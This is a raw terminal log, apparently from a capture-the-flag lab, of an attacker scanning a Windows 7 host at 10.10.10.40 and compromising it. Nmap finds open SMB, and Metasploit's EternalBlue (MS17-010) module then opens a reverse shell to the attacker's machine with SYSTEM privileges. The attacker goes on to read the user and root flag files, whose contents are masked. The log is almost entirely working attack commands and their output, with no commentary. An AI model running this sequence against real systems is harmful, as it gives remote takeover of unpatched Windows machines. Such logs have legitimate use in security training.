allenwest1@debian:~$ ping 10.10.10.40
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=84.3 ms
64 bytes from 10.10.10.40: icmp_seq=4 ttl=127 time=226 ms
^C
--- 10.10.10.40 ping statistics ---
5 packets transmitted, 2 received, 60% packet loss, time 73ms
rtt min/avg/max/mdev = 84.293/155.017/225.742/70.725 ms
allenwest1@debian:~$ nmap -sV -sC -A 10.10.10.40
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-10 14:28 EDT
Nmap scan report for 10.10.10.40
Host is up (0.39s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -16m53s, deviation: 34m35s, median: 3m04s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-04-10T19:32:34+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-10 14:32:32
|_  start_date: 2020-04-10 14:31:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.05 seconds
allenwest1@debian:~$ searchsploit windows 7 smb
[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

----------------------------- -----------------------------------------
 Exploit Title               |  Path
                             | (/opt/exploit-database/)
----------------------------- -----------------------------------------
Microsoft - SMB Server Trans | exploits/windows/dos/14607.py
Microsoft DNS RPC Service -  | exploits/windows/remote/16366.rb
Microsoft Windows - 'Eternal | exploits/windows/remote/43970.rb
Microsoft Windows - 'srv2.sy | exploits/windows/remote/14674.txt
Microsoft Windows - LSASS SM | exploits/windows/dos/40744.txt
Microsoft Windows - SMB Remo | exploits/windows/dos/41891.rb
Microsoft Windows - SMB2 Neg | exploits/windows/dos/12524.py
Microsoft Windows - SmbRelay | exploits/windows/remote/7125.txt
Microsoft Windows 10 (1903/1 | exploits/windows/local/48267.txt
Microsoft Windows 10.0.17134 | exploits/windows/local/47115.txt
Microsoft Windows 7/2008 R2  | exploits/windows/dos/12273.py
Microsoft Windows 7/2008 R2  | exploits/windows/remote/42031.py
Microsoft Windows 7/8.1/2008 | exploits/windows/remote/42315.py
Microsoft Windows 8/8.1/2012 | exploits/windows_x86-64/remote/42030.py
Microsoft Windows 95/Windows | exploits/windows/remote/20371.txt
Microsoft Windows NT 4.0 SP5 | exploits/windows/remote/19197.txt
Microsoft Windows SMB Server | exploits/windows/dos/43517.txt
Microsoft Windows Server 200 | exploits/windows_x86-64/remote/41987.py
Microsoft Windows Vista/7 -  | exploits/windows/dos/9594.txt
Microsoft Windows XP/2000/NT | exploits/windows/dos/21746.c
Microsoft Windows XP/2000/NT | exploits/windows/dos/21747.txt
VideoLAN VLC Client (Windows | exploits/windows_x86/local/16678.rb
VideoLAN VLC Media Player 1. | exploits/windows/dos/9427.py
----------------------------- -----------------------------------------
Shellcodes: No Result
allenwest1@debian:~$ msfconsole
Found a database at /home/allenwest1/.msf4/db, checking to see if it is started
Starting database at /home/allenwest1/.msf4/db...success
[?] Initial MSF web service account username? [allenwest1]: teNORROCKS1234!!
[?] Initial MSF web service account password? (Leave blank for random password): 
Generating SSL key and certificate for MSF web service
MSF web service PID file found, but no active process running as PID 1253
Deleting MSF web service PID file /home/allenwest1/.msf4/msf-ws.pid
Attempting to start MSF web service...failed
[!] MSF web service appears to be started, but may not operate as expected.
MSF web service expects authentication. If you wish to reinitialize the web service account you will need to reinitialize the database.
Please see /home/allenwest1/.msf4/logs/msf-ws.log for additional details.
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __            
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \           
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|          
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_          
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\         
                                                                       

       =[ metasploit v5.0.83-dev-                         ]
+ -- --=[ 1991 exploits - 1088 auxiliary - 340 post       ]
+ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your module, why not try the reload command

msf5 > use exploit/windows/smb/

Matching Modules
================

   #   Name                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                    ---------------  ----       -----  -----------
   0   exploit/windows/smb/generic_smb_dll_injection           2015-03-04       manual     No     Generic DLL Injection From Shared Resource
   1   exploit/windows/smb/group_policy_startup                2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   2   exploit/windows/smb/ipass_pipe_exec                     2015-01-21       excellent  Yes    IPass Control Pipe Remote Command Execution
   3   exploit/windows/smb/ms03_049_netapi                     2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   4   exploit/windows/smb/ms04_007_killbill                   2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
   5   exploit/windows/smb/ms04_011_lsass                      2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
   6   exploit/windows/smb/ms04_031_netdde                     2004-10-12       good       No     MS04-031 Microsoft NetDDE Service Overflow
   7   exploit/windows/smb/ms05_039_pnp                        2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
   8   exploit/windows/smb/ms06_025_rasmans_reg                2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
   9   exploit/windows/smb/ms06_025_rras                       2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
   10  exploit/windows/smb/ms06_040_netapi                     2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   11  exploit/windows/smb/ms06_066_nwapi                      2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
   12  exploit/windows/smb/ms06_066_nwwks                      2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
   13  exploit/windows/smb/ms06_070_wkssvc                     2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   14  exploit/windows/smb/ms07_029_msdns_zonename             2007-04-12       manual     No     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
   15  exploit/windows/smb/ms08_067_netapi                     2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   16  exploit/windows/smb/ms09_050_smb2_negotiate_func_index  2009-09-07       good       No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   17  exploit/windows/smb/ms10_046_shortcut_icon_dllloader    2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
   18  exploit/windows/smb/ms10_061_spoolss                    2010-09-14       excellent  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
   19  exploit/windows/smb/ms15_020_shortcut_icon_dllloader    2015-03-10       excellent  No     Microsoft Windows Shell LNK Code Execution
   20  exploit/windows/smb/ms17_010_eternalblue                2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   21  exploit/windows/smb/ms17_010_eternalblue_win8           2017-03-14       average    No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   22  exploit/windows/smb/ms17_010_psexec                     2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   23  exploit/windows/smb/netidentity_xtierrpcpipe            2009-04-06       great      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
   24  exploit/windows/smb/psexec                              1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   25  exploit/windows/smb/psexec_psh                          1999-01-01       manual     No     Microsoft Windows Authenticated Powershell Command Execution
   26  exploit/windows/smb/smb_delivery                        2016-07-26       excellent  No     SMB Delivery
   27  exploit/windows/smb/smb_doublepulsar_rce                2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
   28  exploit/windows/smb/smb_relay                           2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
   29  exploit/windows/smb/timbuktu_plughntcommand_bof         2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   30  exploit/windows/smb/webexec                             2018-10-24       manual     No     WebExec Authenticated User Code Execution


msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40RHOSTS => 10.10.10.40
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.33:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.33:4444 -> 10.10.10.40:49158) at 2020-04-10 14:38:06 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

whoami
whoami
nt authority\system

C:\Windows\system32>cd C:/
cd C:/

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\

14/07/2009  04:20    <DIR>          PerfLogs
24/12/2017  03:23    <DIR>          Program Files
14/07/2017  17:58    <DIR>          Program Files (x86)
14/07/2017  14:48    <DIR>          Share
21/07/2017  07:56    <DIR>          Users
16/07/2017  21:21    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  15,755,018,240 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,755,018,240 bytes free

C:\Users>cd haris
cd haris

C:\Users\haris>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris

14/07/2017  14:45    <DIR>          .
14/07/2017  14:45    <DIR>          ..
15/07/2017  08:58    <DIR>          Contacts
24/12/2017  03:23    <DIR>          Desktop
15/07/2017  08:58    <DIR>          Documents
15/07/2017  08:58    <DIR>          Downloads
15/07/2017  08:58    <DIR>          Favorites
15/07/2017  08:58    <DIR>          Links
15/07/2017  08:58    <DIR>          Music
15/07/2017  08:58    <DIR>          Pictures
15/07/2017  08:58    <DIR>          Saved Games
15/07/2017  08:58    <DIR>          Searches
15/07/2017  08:58    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  15,755,018,240 bytes free

C:\Users\haris>cd Desktop
cd Desktop

C:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
21/07/2017  07:54                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,755,005,952 bytes free

C:\Users\haris\Desktop>type user.txt
type user.txt
********************************
C:\Users\haris\Desktop>cd C:/Users/Administrator
cd C:/Users/Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Contacts
24/12/2017  03:22    <DIR>          Desktop
21/07/2017  07:56    <DIR>          Documents
21/07/2017  07:56    <DIR>          Downloads
21/07/2017  07:56    <DIR>          Favorites
21/07/2017  07:56    <DIR>          Links
21/07/2017  07:56    <DIR>          Music
21/07/2017  07:56    <DIR>          Pictures
21/07/2017  07:56    <DIR>          Saved Games
21/07/2017  07:56    <DIR>          Searches
21/07/2017  07:56    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  15,754,989,568 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator\Desktop

24/12/2017  03:22    <DIR>          .
24/12/2017  03:22    <DIR>          ..
21/07/2017  07:57                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,754,989,568 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
********************************

